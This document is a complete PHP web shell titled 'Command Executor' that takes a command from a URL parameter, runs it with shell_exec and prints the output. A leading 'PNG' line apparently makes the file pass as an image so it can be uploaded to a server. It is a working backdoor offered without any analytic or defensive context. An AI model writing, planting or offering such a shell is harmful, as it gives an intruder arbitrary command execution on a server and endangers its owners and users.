PNG
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
</head>
<body>
    <h1>Command Executor</h1>
    <form method="GET">
        <label for="command">Enter Command:</label>
        <input type="text" id="command" name="command" required>
        <button type="submit">Run</button>
    </form>
    <hr>
    <?php
    if (isset($_GET['command'])) {
        $command = $_GET['command'];
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    }
    ?>
</body>
</html>